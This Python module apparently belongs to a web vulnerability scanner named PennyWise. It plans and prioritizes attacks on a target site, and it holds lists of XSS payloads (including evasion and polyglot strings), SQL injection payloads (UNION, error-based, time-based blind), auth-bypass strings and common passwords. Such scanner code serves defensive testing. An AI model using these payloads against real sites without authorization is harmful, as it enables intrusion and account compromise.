"""
Attack Selector for PennyWise.
Intelligently selects and prioritizes attack types based on target analysis.
"""

import logging
from typing import List, Dict, Any, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

from ..config import AttackType, SeverityLevel, ScanMode
from .target_analyzer import TargetAnalysis, InputVector
from ..ai.model_interface import AIModelInterface

logger = logging.getLogger(__name__)


@dataclass
class AttackPlan:
    """A planned attack with all necessary details."""
    attack_type: AttackType
    priority: str  # high, medium, low
    confidence: float
    vectors: List[InputVector]
    payloads: List[str]
    reasons: List[str]
    estimated_requests: int = 0


@dataclass
class AttackStrategy:
    """Complete attack strategy for a target."""
    target_url: str
    target_analysis: TargetAnalysis
    attack_plans: List[AttackPlan]
    scan_mode: ScanMode
    total_estimated_requests: int = 0
    total_estimated_time_seconds: int = 0
    
    def get_ordered_attacks(self) -> List[AttackPlan]:
        """Get attacks ordered by priority and confidence."""
        priority_order = {'high': 0, 'medium': 1, 'low': 2}
        return sorted(
            self.attack_plans,
            key=lambda x: (priority_order.get(x.priority, 3), -x.confidence)
        )


class PayloadLibrary:
    """Library of attack payloads for different attack types."""
    
    XSS_PAYLOADS = {
        'basic': [
            "<script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
        ],
        'evasion': [
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<img src=x onerror='alert(1)'>",
            "<body onload=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(1)'>",
        ],
        'dom': [
            "'-alert(1)-'",
            "\"-alert(1)-\"",
            "</script><script>alert(1)</script>",
            "{{constructor.constructor('alert(1)')()}}",
        ],
        'polyglot': [
            "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
        ],
        'detection': [
            "<penny_test_marker>",
            "\"'><penny_test>",
        ]
    }
    
    SQLI_PAYLOADS = {
        'basic': [
            "' OR '1'='1",
            "' OR '1'='1' --",
            "' OR '1'='1' #",
            "\" OR \"1\"=\"1",
            "1' OR '1'='1",
        ],
        'union': [
            "' UNION SELECT NULL--",
            "' UNION SELECT NULL,NULL--",
            "' UNION SELECT NULL,NULL,NULL--",
            "1' UNION SELECT 1,2,3--",
        ],
        'error_based': [
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,version()))--",
            "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ],
        'blind': [
            "' AND '1'='1",
            "' AND '1'='2",
            "' AND SLEEP(5)--",
            "' AND (SELECT SLEEP(5))--",
        ],
        'detection': [
            "'",
            "\"",
            "' OR ''='",
            "1' AND '1'='1",
        ]
    }
    
    CSRF_PAYLOADS = {
        'basic': [
            # CSRF payloads are HTML templates for creating malicious pages
        ]
    }
    
    AUTH_PAYLOADS = {
        'basic': [
            "admin",
            "administrator",
            "' OR '1'='1' --",
            "admin'--",
        ],
        'password': [
            "password",
            "123456",
            "admin123",
            "password123",
        ]
    }
    
    @classmethod
    def get_payloads(cls, attack_type: AttackType, 
                     intensity: str = 'basic') -> List[str]:
        """Get payloads for a specific attack type and intensity."""
        payload_map = {
            AttackType.XSS: cls.XSS_PAYLOADS,
            AttackType.SQLI: cls.SQLI_PAYLOADS,
            AttackType.CSRF: cls.CSRF_PAYLOADS,
            AttackType.AUTH: cls.AUTH_PAYLOADS,
        }
        
        payloads = payload_map.get(attack_type, {})
        
        if intensity == 'all':
            all_payloads = []
            for category_payloads in payloads.values():
                all_payloads.extend(category_payloads)
            return all_payloads
        
        return payloads.get(intensity, payloads.get('basic', []))


class AttackSelector:
    """
    Intelligent attack selector that analyzes targets and creates optimal attack strategies.
    
    Uses:
    - Target analysis results
    - AI model recommendations
    - Historical patterns from behavior learning
    - Scan mode configuration
    """
    
    def __init__(self, 
                 ai_model: Optional[AIModelInterface] = None,
                 scan_mode: ScanMode = ScanMode.ACTIVE):
        """
        Initialize the attack selector.
        
        Args:
            ai_model: AI model interface for enhanced analysis
            scan_mode: Scanning mode affecting payload intensity
        """
        self.ai_model = ai_model
        self.scan_mode = scan_mode
        self.payload_library = PayloadLibrary()
        
        logger.info(f"Attack Selector initialized with mode: {scan_mode.value}")
    
    def create_strategy(self, 
                       target_analysis: TargetAnalysis,
                       user_preferences: Optional[Dict[str, Any]] = None) -> AttackStrategy:
        """
        Create a comprehensive attack strategy based on target analysis.
        
        Args:
            target_analysis: Analysis of the target website
            user_preferences: Optional user preferences for attack selection
            
        Returns:
            AttackStrategy with prioritized attack plans
        """
        attack_plans = []
        
        # Get recommendations from target analysis
        recommendations = target_analysis.get_recommended_attacks()
        
        # Enhance with AI recommendations if available
        if self.ai_model:
            ai_recommendations = self._get_ai_recommendations(target_analysis)
            recommendations = self._merge_recommendations(recommendations, ai_recommendations)
        
        # Apply user preferences if provided
        if user_preferences:
            allowed = user_preferences.get('allowed_attacks')
            if allowed:
                # User explicitly specified attacks - use those directly
                for attack_type in allowed:
                    if isinstance(attack_type, str):
                        try:
                            attack_type = AttackType(attack_type.lower())
                        except ValueError:
                            continue
                    
                    # Create a default recommendation for this attack type
                    rec = {
                        'attack_type': attack_type,
                        'priority': 'high',
                        'confidence': 0.8,
                        'reasons': ['User specified attack type']
                    }
                    
                    attack_plan = self._create_attack_plan(
                        attack_type=attack_type,
                        target_analysis=target_analysis,
                        recommendation=rec
                    )
                    
                    if attack_plan:
                        attack_plans.append(attack_plan)
            else:
                recommendations = self._apply_preferences(recommendations, user_preferences)
        
        # If no plans yet from user preferences, use recommendations
        if not attack_plans:
            for rec in recommendations:
                attack_type = rec.get('attack_type')
                if isinstance(attack_type, str):
                    try:
                        attack_type = AttackType(attack_type.lower())
                    except ValueError:
                        continue
                
                attack_plan = self._create_attack_plan(
                    attack_type=attack_type,
                    target_analysis=target_analysis,
                    recommendation=rec
                )
                
                if attack_plan:
                    attack_plans.append(attack_plan)
        
        # Calculate totals
        total_requests = sum(p.estimated_requests for p in attack_plans)
        # Estimate ~0.5 seconds per request on average
        total_time = int(total_requests * 0.5)
        
        strategy = AttackStrategy(
            target_url=target_analysis.url,
            target_analysis=target_analysis,
            attack_plans=attack_plans,
            scan_mode=self.scan_mode,
            total_estimated_requests=total_requests,
            total_estimated_time_seconds=total_time
        )
        
        logger.info(f"Created attack strategy with {len(attack_plans)} attack plans")
        return strategy
    
    def _get_ai_recommendations(self, 
                                target_analysis: TargetAnalysis) -> List[Dict[str, Any]]:
        """Get attack recommendations from AI model."""
        try:
            # Perform site audit with AI
            response = self.ai_model.audit_site(
                url=target_analysis.url,
                html=target_analysis.html_sample,
                title=target_analysis.title
            )
            
            if response.success:
                return self.ai_model.recommend_attacks({'data': response.data})
            
        except Exception as e:
            logger.warning(f"AI recommendation failed: {e}")
        
        return []
    
    def _merge_recommendations(self,
                               analysis_recs: List[Dict[str, Any]],
                               ai_recs: List[Dict[str, Any]]) -> List[Dict[str, Any]]:
        """Merge and deduplicate recommendations from different sources."""
        merged = {}
        
        # Add analysis recommendations
        for rec in analysis_recs:
            attack_type = rec.get('attack_type')
            key = attack_type.value if isinstance(attack_type, AttackType) else str(attack_type)
            
            if key not in merged or rec.get('confidence', 0) > merged[key].get('confidence', 0):
                merged[key] = rec
        
        # Merge AI recommendations (boost confidence if both agree)
        for rec in ai_recs:
            attack_type = rec.get('attack_type', '')
            key = attack_type.lower() if isinstance(attack_type, str) else str(attack_type)
            
            if key in merged:
                # Boost confidence when multiple sources agree
                merged[key]['confidence'] = min(
                    merged[key].get('confidence', 0.5) * 1.3,
                    1.0
                )
                merged[key]['reasons'] = merged[key].get('reasons', []) + rec.get('reasons', [])
                merged[key]['from_ai'] = True
            else:
                merged[key] = rec
        
        return list(merged.values())
    
    def _apply_preferences(self,
                          recommendations: List[Dict[str, Any]],
                          preferences: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Apply user preferences to filter or prioritize recommendations."""
        
        # Filter by allowed attack types
        allowed_types = preferences.get('allowed_attacks')
        if allowed_types:
            recommendations = [
                r for r in recommendations
                if str(r.get('attack_type', '')).lower() in [str(t).lower() for t in allowed_types]
            ]
        
        # Exclude certain attack types
        excluded_types = preferences.get('excluded_attacks', [])
        if excluded_types:
            recommendations = [
                r for r in recommendations
                if str(r.get('attack_type', '')).lower() not in [str(t).lower() for t in excluded_types]
            ]
        
        # Filter by minimum confidence
        min_confidence = preferences.get('min_confidence', 0)
        if min_confidence > 0:
            recommendations = [
                r for r in recommendations
                if r.get('confidence', 0) >= min_confidence
            ]
        
        return recommendations
    
    def _create_attack_plan(self,
                           attack_type: AttackType,
                           target_analysis: TargetAnalysis,
                           recommendation: Dict[str, Any]) -> Optional[AttackPlan]:
        """Create a detailed attack plan for a specific attack type."""
        
        # Get relevant vectors for this attack type
        vectors = self._select_vectors(attack_type, target_analysis, recommendation)
        
        # If no vectors found, create default query parameter vectors
        if not vectors and attack_type not in [AttackType.CSRF, AttackType.AUTH]:
            vectors = self._create_default_vectors(target_analysis.url, attack_type)
        
        # Select payloads based on scan mode
        intensity = self._get_payload_intensity()
        payloads = self.payload_library.get_payloads(attack_type, intensity)
        
        if not payloads:
            payloads = self.payload_library.get_payloads(attack_type, 'basic')
        
        # Must have either vectors or payloads to be useful
        if not payloads:
            return None
        
        # Estimate number of requests
        estimated_requests = max(len(vectors), 1) * len(payloads)
        
        return AttackPlan(
            attack_type=attack_type,
            priority=recommendation.get('priority', 'medium'),
            confidence=recommendation.get('confidence', 0.5),
            vectors=vectors,
            payloads=payloads,
            reasons=recommendation.get('reasons', []),
            estimated_requests=estimated_requests
        )
    
    def _create_default_vectors(self, url: str, attack_type: AttackType) -> List[InputVector]:
        """Create default injection vectors when none are found."""
        # Common parameter names to test
        param_names = {
            AttackType.XSS: ['q', 'search', 'query', 'keyword', 'input', 'name', 'message', 'text'],
            AttackType.SQLI: ['id', 'user', 'name', 'category', 'page', 'sort', 'order', 'filter'],
            AttackType.AUTH: ['username', 'user', 'email', 'password'],
            AttackType.CSRF: [],
            AttackType.SSRF: ['url', 'link', 'src', 'path', 'file'],
            AttackType.IDOR: ['id', 'uid', 'user_id', 'account', 'doc'],
        }
        
        params = param_names.get(attack_type, ['id', 'q', 'search'])
        vectors = []
        
        for param in params[:5]:  # Limit to first 5 params
            vectors.append(InputVector(
                url=url,
                parameter=param,
                location='query',
                method='GET',
                suspected_type='unknown'
            ))
        
        return vectors
    
    def _select_vectors(self,
                       attack_type: AttackType,
                       target_analysis: TargetAnalysis,
                       recommendation: Dict[str, Any]) -> List[InputVector]:
        """Select relevant input vectors for the attack type."""
        
        # Use vectors from recommendation if available
        rec_vectors = recommendation.get('vectors', [])
        if rec_vectors and isinstance(rec_vectors[0], InputVector):
            return rec_vectors[:20]  # Limit to prevent excessive testing
        
        # Otherwise, select based on attack type
        all_vectors = target_analysis.input_vectors
        
        if attack_type == AttackType.XSS:
            # Prefer search, comment, and body parameters
            preferred = ['search', 'user_input', 'unknown']
            vectors = [v for v in all_vectors if v.suspected_type in preferred]
            if not vectors:
                vectors = [v for v in all_vectors if v.location in ['query', 'body']]
        
        elif attack_type == AttackType.SQLI:
            # Prefer ID and filter parameters
            preferred = ['id', 'filter', 'pagination']
            vectors = [v for v in all_vectors if v.suspected_type in preferred]
            if not vectors:
                vectors = [v for v in all_vectors if v.location == 'query']
        
        elif attack_type == AttackType.AUTH:
            # Look for login forms
            vectors = []
            for form in target_analysis.forms:
                if form.is_login_form:
                    for field_name in form.fields:
                        vectors.append(InputVector(
                            url=form.action,
                            parameter=field_name,
                            location='body',
                            suspected_type='auth'
                        ))
        
        else:
            vectors = all_vectors
        
        return vectors[:20]  # Limit vectors
    
    def _get_payload_intensity(self) -> str:
        """Get payload intensity based on scan mode."""
        intensity_map = {
            ScanMode.PASSIVE: 'detection',
            ScanMode.ACTIVE: 'basic',
            ScanMode.AGGRESSIVE: 'all',
            ScanMode.STEALTH: 'detection'
        }
        return intensity_map.get(self.scan_mode, 'basic')
    
    def select_single_attack(self,
                            target_analysis: TargetAnalysis) -> Tuple[AttackType, float]:
        """
        Select the single best attack type for a target.
        
        Returns:
            Tuple of (AttackType, confidence_score)
        """
        scores = {
            AttackType.XSS: target_analysis.potential_xss,
            AttackType.SQLI: target_analysis.potential_sqli,
            AttackType.CSRF: target_analysis.potential_csrf,
            AttackType.AUTH: target_analysis.potential_auth_issues
        }
        
        best_attack = max(scores.items(), key=lambda x: x[1])
        return best_attack
    
    def explain_selection(self, 
                         attack_plan: AttackPlan) -> str:
        """Generate a human-readable explanation for an attack selection."""
        lines = [
            f"Attack Type: {attack_plan.attack_type.value.upper()}",
            f"Priority: {attack_plan.priority.capitalize()}",
            f"Confidence: {attack_plan.confidence:.0%}",
            "",
            "Reasons:",
        ]
        
        for reason in attack_plan.reasons:
            lines.append(f"  • {reason}")
        
        lines.extend([
            "",
            f"Injection Points: {len(attack_plan.vectors)}",
            f"Payloads to Test: {len(attack_plan.payloads)}",
            f"Estimated Requests: {attack_plan.estimated_requests}"
        ])
        
        return "\n".join(lines)
